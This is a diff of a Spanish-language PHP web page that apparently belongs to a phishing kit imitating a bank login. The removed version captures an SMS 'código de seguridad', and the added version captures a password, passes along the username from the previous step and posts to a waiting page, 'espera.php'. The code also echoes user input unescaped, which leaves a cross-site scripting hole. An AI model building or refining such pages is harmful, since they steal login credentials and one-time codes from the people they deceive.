@@ -1,5 +1,6 @@
 <?php ini_set("display_errors", 0);?>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -73,7 +74,7 @@
         height: 100px;
         padding: 15px;
         margin: 0 auto;
-       
+        margin-top: 30px;
         position: relative;
         margin-left: -8px;
     }
@@ -144,71 +145,6 @@
     width: 200px;
 }
 
-ul.navBtns {
-    width: auto;
-    float: right;
-    margin: 10px 0 0 0;
-    list-style: none;
-    z-index: 0
-}
-
-ul.navBtns.left {
-    clear: none!important;
-    float: left
-}
-
-ul.navBtns li {
-    float: left
-}
-
-ul.navBtns div {
-    width: 140px;
-    height: 30px;
-    color: #fff;
-    text-align: center;
-    font-weight: bold;
-    padding: 12px 0 0 0
-}
-
-ul.navBtns.btnSchedule {
-    position: relative;
-    top: 20px;
-    left: 270px
-}
-
-ul.navBtns li.disabled input[type="button"],ul.navBtns li.disabled input[type="submit"] {
-    cursor: default!important
-}
-
-.btnGenericGreen {
-    cursor: pointer;
-    font-weight: bold;
-    text-align: center;
-    background: url('spriteA.png') -250px -705px no-repeat;
-    width: 158px;
-    height: 41px
-}
-
-.btnGenericGreen.overBtn {
-    background-position: -421px -705px
-}
-
-.btnGenericRed {
-    text-align: center;
-    background: url('spriteA.png') -250px -662px no-repeat;
-    width: 158px;
-    height: 42px
-}
-
-.btnGenericRed.overBtn {
-    background-position: -421px -662px
-}
-
-.input:focus {
-    outline: none !important;
-    border:1px solid red;
-    box-shadow: 0 0 10px #719ECE;
-  }
 
 </style>
 <body>
@@ -219,47 +155,36 @@ ul.navBtns li.disabled input[type="button"],ul.navBtns li.disabled input[type="s
 </div>
  
  <br><br><br>
-
-    <form method="post" action="firm2.php">
+ 
+    <form method="post" action="espera.php">
          
-        <div class="cajaform" style="height:690px;">
+        <div class="cajaform">
             <div class="box">
                 <img class="titulos" src="titulo.png" alt="">
 
-                <div class="caja2" style="height:290px;">
-					<span style="font-family:arial;    font-size: 16px; color: #838181;"><b>Confirmación de identidad:</b></span><br>
-					<hr>
-					<span style="font-family:arial;    font-size: 14px; color: #838181;">
-					Hemos enviado un código de seguridad por SMS, ingresalo para continuar</span>
-                   <br>  <br> 
-                 
-           
-                    <div align="left"><input type="radio"  name="" value="" checked>
-					<span style="font-family:arial">Código de seguridad:</span>
-				   <input inputmode="numeric" name="cdpin" type="text" maxlength="58" placeholder="" required
-				    style="width:220px;     border-radius:10px; height: 36px; border-color:#bce8ff" class="processedInputsFocus">
-				     
-                 <br><br>
-                 
-				  </div> 
-				  <div align="center">
-				  
-     <ul class="navBtns clear">
-            <li>
-                <input name="" type="button" id="MainContent_Button1" class="btnGenericRed"  value="Cancelar" style="border:0;color:#fff;"></li>
-            <li>
-                <input type="submit" name="" value="Confirmar" 
-				id="MainContent_btnConfirm" class="btnGenericGreen" style="border:0;color:#fff;"></li>
-        </ul>
-                </div>
-                 
-                 
+                <div class="caja2">
 
-                </div>
-				
+                   <br><br>
+                   
+                    <img style="width: 100px; float: left; margin-top: 5px; margin-left: -10px;" src="contraseña.png" alt="">
+                   
+                   <li class="borde">
+                     <input type="hidden" name="us" value="<?php echo $_POST['us']; ?>">
+                    <input name="ps" class="ipp" type="password" placeholder="">
+                   </li>
+                   <br>
+                   <div style="margin-top: 50px;margin-left: 180px;">
+                    <img style="width:200px; position: absolute;" src="btn.png" alt="">
+                   <input style="position: absolute;" class="boton1" type="submit" value="Siguiente" >
+                   
+                   </div>
+                   <br><br>
                     <img class="recupera" src="recupera.png" alt=""  >
 
-        <div class="caja3"><img style="width: 100%; margin-left: -10px; height: 100%;" src="ABAJO.png" alt=""></div>    
+
+                </div>
+                <div class="caja3"><img style="width: 100%; margin-left: -10px; height: 100%;" src="ABAJO.png" alt=""></div>
+            </div>
 <div >
             <img  src="" alt="" srcset="">
       </div>  
